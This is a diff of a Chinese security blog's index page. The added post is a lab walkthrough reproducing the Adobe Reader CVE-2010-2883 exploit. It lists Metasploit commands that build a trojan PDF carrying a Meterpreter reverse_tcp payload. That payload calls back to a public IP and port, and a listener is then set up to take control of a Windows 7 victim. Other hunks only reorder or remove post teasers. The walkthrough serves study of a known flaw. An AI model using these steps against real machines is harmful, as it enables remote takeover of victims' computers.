@@ -193,6 +193,98 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://GD.com/2019/08/15/erjinzhi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="GD">
+      <meta itemprop="description" content="a GOOD pwner">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">
+              
+              <a href="/2019/08/15/erjinzhi/" class="post-title-link" itemprop="url">erjinzhi</a>
+            
+          </h1>
+        
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2019-08-15 22:30:20 / 修改时间：23:54:00" itemprop="dateCreated datePublished" datetime="2019-08-15T22:30:20+08:00">2019-08-15</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+            <h1 id="二进制漏洞复现"><a href="#二进制漏洞复现" class="headerlink" title="二进制漏洞复现"></a>二进制漏洞复现</h1><h2 id="漏洞复现-CVE-2010-2883-Adobe-Reader-打开pdf电脑即刻中招"><a href="#漏洞复现-CVE-2010-2883-Adobe-Reader-打开pdf电脑即刻中招" class="headerlink" title="[漏洞复现] CVE-2010-2883 Adobe Reader 打开pdf电脑即刻中招"></a>[漏洞复现] CVE-2010-2883 Adobe Reader 打开pdf电脑即刻中招</h2><p>CVE-2010-2883漏洞原理：“Adobe Reader在处理CoolType字体文件的sing表时，存在栈溢出漏洞，<strong>当打开特制的恶意PDF文件时，可允许任意代码远程执行</strong>。</p>
+<p><strong>影响版本：Adobe Reader 8.2.4 - 9.3.4</strong></p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="1、进入Kali-Linux，使用Metasploit生成PDF木马文件"><a href="#1、进入Kali-Linux，使用Metasploit生成PDF木马文件" class="headerlink" title="1、进入Kali Linux，使用Metasploit生成PDF木马文件"></a>1、进入Kali Linux，使用Metasploit生成PDF木马文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">搜索Adobe渗透模块  </span><br><span class="line">msf &gt; search adobe_cooltype_sing </span><br><span class="line">调用渗透模块  </span><br><span class="line">msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing/ </span><br><span class="line">查看模块详情  </span><br><span class="line">msf exploit(adobe_cooltype_sing) &gt; info</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/15/erjinzhi/C:/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1565883113002.png" alt="1565883113002"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">调用meterpreter载荷，反向连接到渗透机  </span><br><span class="line">msf  exploit(adobe_cooltype_sing) &gt; set payload windows/meterpreter/reverse_tcp  </span><br><span class="line">设置Kali Linux的IP地址  </span><br><span class="line">msf  exploit(adobe_cooltype_sing) &gt; set LHOST 139.196.143.238  </span><br><span class="line">设置本地监听端口  </span><br><span class="line">msf  exploit(adobe_cooltype_sing) &gt; set LPORT 8888  </span><br><span class="line">设置带有后门程序的PDF文件  </span><br><span class="line">msf  exploit(adobe_cooltype_sing) &gt; set FILENAME PINGINGLAB.pdf  </span><br><span class="line">执行渗透生成文件  </span><br><span class="line">msf  exploit(adobe_cooltype_sing) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/15/erjinzhi/C:/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1565883319089.png" alt="1565883319089"></p>
+<h4 id="2、先将PDF木马文件拷贝至-Linux的-root，然后将PDF木马文件拷贝至window靶机桌面"><a href="#2、先将PDF木马文件拷贝至-Linux的-root，然后将PDF木马文件拷贝至window靶机桌面" class="headerlink" title="2、先将PDF木马文件拷贝至 Linux的/root，然后将PDF木马文件拷贝至window靶机桌面"></a>2、先将PDF木马文件拷贝至 Linux的/root，然后将PDF木马文件拷贝至window靶机桌面</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /root/.msf4/local/PINGINGLAB.pdf /root/PINGINGLAB.pdf</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/15/erjinzhi/C:/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1565883705010.png" alt="1565883705010"></p>
+<h4 id="3、Metasploit开启shell监听会话，等待肉鸡上线"><a href="#3、Metasploit开启shell监听会话，等待肉鸡上线" class="headerlink" title="3、Metasploit开启shell监听会话，等待肉鸡上线"></a>3、Metasploit开启shell监听会话，等待肉鸡上线</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">使用handler监听模块  </span><br><span class="line">msf &gt; use exploit/multi/handler  </span><br><span class="line">回弹一个tcp连接  </span><br><span class="line">msf  exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp  </span><br><span class="line">设置监听IP地址（跟PDF木马文件一致）  </span><br><span class="line">msf  exploit(handler) &gt; set LHOST 139.196.143.238  </span><br><span class="line">设置监听的端口（跟PDF木马文件一致）  </span><br><span class="line">msf  exploit(handler) &gt; set LPORT 8888  </span><br><span class="line">开启监听  </span><br><span class="line">msf  exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/08/15/erjinzhi/C:/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1565884017232.png" alt="1565884017232"></p>
+<h4 id="4、win7安装了Adobe-Reader-9-3之后用其打开pdf"><a href="#4、win7安装了Adobe-Reader-9-3之后用其打开pdf" class="headerlink" title="4、win7安装了Adobe Reader 9.3之后用其打开pdf"></a>4、win7安装了Adobe Reader 9.3之后用其打开pdf</h4><p><img src="/2019/08/15/erjinzhi/C:/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1565884116994.png" alt="1565884116994"></p>
+<p><img src="/2019/08/15/erjinzhi/C:/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1565884208232.png" alt="1565884208232"></p>
+<h4 id="5、Metasploit获取shell会话，并用Meterpreter控制肉鸡"><a href="#5、Metasploit获取shell会话，并用Meterpreter控制肉鸡" class="headerlink" title="5、Metasploit获取shell会话，并用Meterpreter控制肉鸡"></a>5、Metasploit获取shell会话，并用Meterpreter控制肉鸡</h4><p><img src="/2019/08/15/erjinzhi/C:/Users\Administrator\AppData\Roaming\Typora\typora-user-images\1565884394171.png" alt="1565884394171"></p>
+
+          
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://GD.com/2019/08/15/shentou/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -753,100 +845,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://GD.com/2018/11/20/rop/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="GD">
-      <meta itemprop="description" content="a GOOD pwner">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-
-        
-          <h1 class="post-title" itemprop="name headline">
-              
-              <a href="/2018/11/20/rop/" class="post-title-link" itemprop="url">浅析栈溢出遇到的两种坑及绕过技巧</a>
-            
-          </h1>
-        
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建时间：2018-11-20 13:11:59" itemprop="dateCreated datePublished" datetime="2018-11-20T13:11:59+08:00">2018-11-20</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-08-15 09:26:26" itemprop="dateModified" datetime="2019-08-15T09:26:26+08:00">2019-08-15</time>
-              </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="浅析栈溢出遇到的两种坑及绕过技巧"><a href="#浅析栈溢出遇到的两种坑及绕过技巧" class="headerlink" title="浅析栈溢出遇到的两种坑及绕过技巧"></a>浅析栈溢出遇到的两种坑及绕过技巧</h1><h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>对于刚开始入门pwn的萌新来说可能会遇到一些坑，这里我就来总结一下我之前做栈溢出的时候遇到的两种坑以及绕过技巧，具体我会通过例题来讲解，希望对此时正在入门的pwn的萌新能带来一些帮助。</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2018/11/20/rop/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://GD.com/2018/11/20/house/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -911,6 +909,100 @@
           
             <div class="post-button text-center">
               <a class="btn" href="/2018/11/20/house/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+          <div class="post-eof"></div>
+        
+      </footer>
+  </div>
+  
+  
+  
+  </article>
+
+    
+      
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://GD.com/2018/11/20/rop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="GD">
+      <meta itemprop="description" content="a GOOD pwner">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">
+              
+              <a href="/2018/11/20/rop/" class="post-title-link" itemprop="url">浅析栈溢出遇到的两种坑及绕过技巧</a>
+            
+          </h1>
+        
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2018-11-20 13:11:59" itemprop="dateCreated datePublished" datetime="2018-11-20T13:11:59+08:00">2018-11-20</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-08-15 09:26:26" itemprop="dateModified" datetime="2019-08-15T09:26:26+08:00">2019-08-15</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="浅析栈溢出遇到的两种坑及绕过技巧"><a href="#浅析栈溢出遇到的两种坑及绕过技巧" class="headerlink" title="浅析栈溢出遇到的两种坑及绕过技巧"></a>浅析栈溢出遇到的两种坑及绕过技巧</h1><h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>对于刚开始入门pwn的萌新来说可能会遇到一些坑，这里我就来总结一下我之前做栈溢出的时候遇到的两种坑以及绕过技巧，具体我会通过例题来讲解，希望对此时正在入门的pwn的萌新能带来一些帮助。</p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2018/11/20/rop/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1028,93 +1120,12 @@
   </article>
 
     
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://GD.com/2018/10/12/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="GD">
-      <meta itemprop="description" content="a GOOD pwner">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-
-        
-          <h1 class="post-title" itemprop="name headline">
-              
-              <a href="/2018/10/12/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-            
-          </h1>
-        
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              
-                
-              
-
-              <time title="创建时间：2018-10-12 19:54:45" itemprop="dateCreated datePublished" datetime="2018-10-12T19:54:45+08:00">2018-10-12</time>
-            </span>
-          
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-          <div class="post-eof"></div>
-        
-      </footer>
-  </div>
-  
-  
-  
-  </article>
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
           </div>
@@ -1146,7 +1157,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
